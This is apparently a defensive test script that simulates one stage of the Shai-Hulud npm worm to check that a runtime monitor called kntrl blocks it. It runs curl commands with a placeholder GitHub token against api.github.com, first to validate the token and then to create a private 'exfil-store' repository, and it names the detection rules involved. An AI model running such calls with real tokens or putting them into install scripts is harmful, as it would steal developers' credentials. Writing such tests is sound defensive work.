/**
 * Stage 4 — GitHub API abuse
 *
 * Shai-Hulud uses stolen GITHUB_TOKEN to:
 *   1. Validate the token (GET /user)
 *   2. Create a private repo to store exfiltrated credentials
 *   3. Push stolen tokens to the repo for later retrieval
 *
 * This is distinctive because npm install has NO legitimate reason
 * to call api.github.com.
 *
 * kntrl detection:
 *   - Rego rule 2: blocks npm/node children from api.github.com
 *   - YAML blocked_chains: blocks curl from npm ancestry
 */

const { execSync } = require("child_process");

// --- Attempt 1: Validate stolen token ---
console.log("  [github] Attempting token validation: curl → api.github.com/user ...");
try {
  execSync(
    `curl -s -m 5 -H "Authorization: token ghp_SIMULATED_NOT_REAL" https://api.github.com/user`,
    { stdio: "inherit", timeout: 8000 }
  );
  console.log("  [github] WARNING: GitHub API call succeeded (should be blocked!)");
} catch (err) {
  if (err.signal === "SIGKILL") {
    console.log("  [github] curl killed by kntrl (SIGKILL) — process chain block");
  } else {
    console.log("  [github] curl to api.github.com blocked — expected");
  }
}

// --- Attempt 2: Create exfil repo ---
console.log("  [github] Attempting repo creation: curl → api.github.com/user/repos ...");
try {
  const repoPayload = JSON.stringify({ name: "exfil-store", private: true });
  execSync(
    `curl -s -m 5 -X POST -H "Authorization: token ghp_SIMULATED_NOT_REAL" -d '${repoPayload}' https://api.github.com/user/repos`,
    { stdio: "inherit", timeout: 8000 }
  );
  console.log("  [github] WARNING: Repo creation succeeded (should be blocked!)");
} catch (err) {
  if (err.signal === "SIGKILL") {
    console.log("  [github] curl killed by kntrl (SIGKILL)");
  } else {
    console.log("  [github] curl to api.github.com blocked — expected");
  }
}
